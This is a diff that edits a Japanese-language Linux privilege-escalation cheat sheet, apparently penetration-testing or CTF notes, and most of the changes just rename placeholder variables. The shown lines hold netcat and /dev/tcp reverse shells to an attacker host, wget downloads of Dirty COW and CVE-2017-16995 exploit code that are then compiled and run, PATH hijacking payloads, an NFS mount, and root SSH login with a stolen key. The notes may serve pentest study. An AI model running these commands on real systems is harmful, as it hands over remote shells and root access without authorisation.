@@ -23,7 +23,7 @@
 echo >> <file.sh>
 ```
 ```zsh
-echo "mkfifo /tmp/f; nc <AttackerIP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <file.sh>
+echo "mkfifo /tmp/f; nc <attacker_IP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <file.sh>
 ```
 ```zsh
 chmod +x <file.sh>
@@ -63,7 +63,7 @@ ls -la <directory>
 5. 書き込み可能かつPATH変数の値であるディレクトリに、ステップ２の実行ファイルと同じファイル名のペイロードを用意
 ```zsh
 cd <directory>
-echo "mkfifo /tmp/f; nc <AttackerIP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <(同じ名前)file.sh>
+echo "mkfifo /tmp/f; nc <attacker_IP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <(同じ名前)file.sh>
 ```
 ```zsh
 chmod +x <(同じ名前)file.sh>
@@ -88,7 +88,6 @@ chmod +x <(同じ名前)file.sh>
 	- `/etc/passwd`の第二フィールドに`x`ではなくパスワードハッシュがある場合、`/etc/shadow`よりも優先される仕様がある
 
 - 条件：`/etc/passwd`が書き込み可能
-	- （`/etc/shadow`でも可能）
 
 1. パスワードハッシュを生成する
 ```zsh
@@ -160,7 +159,7 @@ openssl passwd -6 <pw>
 
 ### 事前調査
 
-脆弱性の有無を判断するため、以下4つを確認する
+脆弱性の有無を判断するため、以下4つを確認する。
 
 1. PATH変数のディレクトリを確認
 ```zsh
@@ -482,7 +481,7 @@ ls -la <directory_full_path>
 ```zsh
 sudo su
 mkdir /tmp/nfs
-mount -o rw,vers=3 $TargetIP:<writable_directory_full_path> /tmp/nfs
+mount -o rw,vers=3 $target_IP:<writable_directory_full_path> /tmp/nfs
 ```
 
 3. ペイロードを生成し、マウントフォルダに保存する
@@ -580,7 +579,7 @@ python -m http.server 8080
 
 2. ターゲットマシンにコピーし、コンパイルし、exploit実行
 ```zsh
-wget http://<AttackerIP>:8080/40847.cpp
+wget http://<attacker_IP>:8080/40847.cpp
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ./dcow -s
 ```
@@ -595,7 +594,7 @@ python -m http.server 8080
 
 2. ターゲットマシンにコピーし、コンパイルし、exploit実行を
 ```zsh
-wget http://<AttackerIP>:8080/40839.c -O dirty.c
+wget http://<attacker_IP>:8080/40839.c -O dirty.c
 gcc -pthread dirty.c -o dirty -lcrypt
 ./dirty [任意のパスワード]
 ```
@@ -660,7 +659,7 @@ python -m http.server 8080
 
 2. ターゲット上にダウンロードし、コンパイルして実行
 ```zsh
-wget http://<AttackerIP>:8080/45010.c -O cve-2017-16995
+wget http://<attacker_IP>:8080/45010.c -O cve-2017-16995
 gcc cve-2017-16995.c -o cve-2017-16995
 ```
 
@@ -676,7 +675,7 @@ python -m http.server 8080
 
 2. ターゲットマシン上にダウンロードし、コンパイルして実行
 ```zsh
-wget http://<AttackerIP>:8080/exploit.c
+wget http://<attacker_IP>:8080/exploit.c
 # コンパイルが失敗する場合は、攻撃者マシン上でgcc -staticでコンパイル
 # 攻撃者マシン上でstaticでコンパイルした場合は実行時にエラーが表示されるが多分問題なし
 gcc exploit.c -o exploit
@@ -960,7 +959,7 @@ touch -- '-R'
 ```zsh
 cat > shell.sh << 'EOF'
 #!/bin/bash
-/bin/bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1
+/bin/bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1
 EOF
 chmod +x shell.sh
 ```
@@ -1085,7 +1084,7 @@ cat <ssh_key>
 # 攻撃者マシン上でキーをコピーしたファイルを作成し、ターゲットにrootで接続
 echo '<ssh_key>' > ssh.key
 chmod 777 ssh.key
-ssh -i ssh.key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@$TargetIP
+ssh -i ssh.key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@$target_IP
 ```
 
 ---
